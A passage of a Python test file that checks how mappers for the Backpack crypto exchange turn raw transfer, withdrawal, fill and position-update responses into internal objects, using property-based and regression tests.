    ) -> None:
        """Property: Very large client IDs should be handled safely."""
        transfer_data = {
            "id": "transfer123",
            "status": "success",
            "timestamp": "1678886400000",
        }

        result = transfer_mapper.transform_raw_transfer_to_internal(
            raw_response=cast("RawJsonResponse", transfer_data),
            exchange_name=ExchangeName.BACKPACK,
            asset="USDC",
            quantity=Decimal(100),
            from_account_type_raw="spot",
            to_account_type_raw="margin",
            client_transfer_id=large_client_id,
        )

        # Property: Large client IDs should be preserved
        assert result.bp_details is not None
        assert result.bp_details.client_id == large_client_id

    @given(
        transformation_error=st.sampled_from([
            ValueError("Invalid decimal"),
            InvalidOperation("Decimal error"),
            KeyError("Missing field"),
        ]),
    )
    @settings(max_examples=30, deadline=None)
    def test_transformation_error_wrapping_properties(
        self,
        transaction_mapper: BackpackTransactionMapper,
        transformation_error: Exception,
    ) -> None:
        """Property: Transformation errors should be properly wrapped."""
        fill_data = {
            "tradeId": 12345,
            "symbol": "SOL-USDC",
            "side": "Bid",
            "quantity": "10.0",
            "price": "100.0",
            "fee": "0.05",
            "feeSymbol": "USDC",
            "isMaker": True,
            "timestamp": "2024-01-15T10:30:00Z",
            "orderId": "order123",
            "clientId": "client123",
            "systemOrderType": None,
        }

        raw_fill = BackpackRawFillResponse.model_validate(fill_data)

        # Mock to raise transformation error
        with patch(
            "cyberdelta.apis.backpack.mappers.account.bp_transaction_mapper.parse_decimal_value",
        ) as mock_parse:
            mock_parse.side_effect = transformation_error

            with pytest.raises(TransformationError) as exc_info:
                transaction_mapper.transform_ws_fill_event_to_internal_fill(raw_fill)

            # Property: Error should be properly wrapped
            assert "Failed to transform BackpackRawFillResponse to Fill" in str(exc_info.value)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_transfer_transformation_basic_functionality(
    transfer_mapper: BackpackTransferMapper,
) -> None:
    """Test basic transfer transformation for regression."""
    raw_response = cast(
        "RawJsonResponse",
        {
            "id": "transfer123",
            "status": "success",
            "message": "Transfer completed",
            "timestamp": "1678886400000",
        },
    )

    result = transfer_mapper.transform_raw_transfer_to_internal(
        raw_response=raw_response,
        exchange_name=ExchangeName.BACKPACK,
        asset="USDC",
        quantity=Decimal("1000.0"),
        from_account_type_raw="spot",
        to_account_type_raw="margin",
        client_transfer_id="client123",
    )

    assert isinstance(result, Transfer)
    assert result.id == "transfer123"
    assert result.status == InternalTransferStatus.COMPLETED


def test_withdrawal_transformation_basic_functionality(
    transfer_mapper: BackpackTransferMapper,
) -> None:
    """Test basic withdrawal transformation for regression."""
    raw_response = BackpackRawWithdrawalResponse.model_validate({
        "id": 123,
        "status": "confirmed",
        "blockchain": "Ethereum",
        "quantity": "1000.0",
        "fee": "5.0",
        "symbol": "USDC",
        "toAddress": "0xabc123",
        "createdAt": "2024-01-15T10:30:00Z",
        "isInternal": False,
        "transactionHash": "0xhash123",
    })

    result = transfer_mapper.transform_raw_withdrawal_response_to_internal(
        raw_response=raw_response,
        asset="USDC",
        quantity=Decimal("1000.0"),
        address="0xabc123",
        network="ethereum",
        client_withdrawal_id="client123",
        tag=None,
    )

    assert isinstance(result, Withdrawal)
    assert result.id == "123"
    assert result.status == InternalWithdrawalStatus.COMPLETED


def test_fill_transformation_basic_functionality(
    transaction_mapper: BackpackTransactionMapper,
) -> None:
    """Test basic fill transformation for regression."""
    raw_fill = BackpackRawFillResponse(
        tradeId=12345,
        symbol="SOL-USDC",
        side="Bid",
        quantity="10.0",
        price="100.0",
        fee="0.05",
        feeSymbol="USDC",
        isMaker=True,
        timestamp="2024-01-15T10:30:00Z",
        orderId="order123",
        clientId="client123",
        systemOrderType=None,
    )

    result = transaction_mapper.transform_ws_fill_event_to_internal_fill(raw_fill)

    assert result is not None
    assert isinstance(result, Fill)
    assert result.id == "12345"
    assert result.side == OrderSide.BUY


def test_position_update_transformation_basic_functionality(
    position_mapper: BackpackPositionMapper,
) -> None:
    """Test basic position update transformation for regression."""
    raw_position_update = BackpackRawPositionUpdate(
        e="positionUpdate",
        E=1678886400000,
        s="SOL-USDC",
        b="100.25",
        B="100.00",
        l="90.00",
        f="0.05",
        M="100.50",
        m="0.02",
        q="10.0",
        Q="10.0",
        n="1000.0",
    )

    result = position_mapper.transform_ws_position_update_to_internal_position(raw_position_update)

    assert isinstance(result, DerivativePosition)
    assert result.side == OrderSide.BUY
    assert result.size == Decimal("10.0")
